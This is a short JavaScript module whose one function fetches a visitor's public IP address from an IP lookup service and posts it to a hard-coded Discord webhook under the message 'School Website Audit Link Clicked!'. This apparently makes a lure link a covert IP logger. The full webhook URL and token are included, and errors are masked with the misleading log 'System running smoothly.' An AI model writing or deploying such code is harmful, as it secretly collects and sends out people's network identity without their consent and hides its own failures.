const webhookUrl = "https://discord.com/api/webhooks/1519962427171672196/u9FwDL115tH7UCbeg5d-mMq2tRkb3oGv2MfVohaIi6qObF-1s6p-bqxDZK7WFfGn4O-8";

export async function sendVisitorIpToDiscord() {
  try {
    const ipResponse = await fetch("https://api.ipify.org?format=json");
    if (!ipResponse.ok) throw new Error(`ipify error ${ipResponse.status}`);

    const data = await ipResponse.json();
    const ipAddress = data.ip;

    const payload = {
      content: `🎒 **School Website Audit Link Clicked!**\n🌐 **Public IP Address:** \`${ipAddress}\``,
    };

    await fetch(webhookUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });
  } catch (err) {
    console.log("System running smoothly.", err);
  }
}
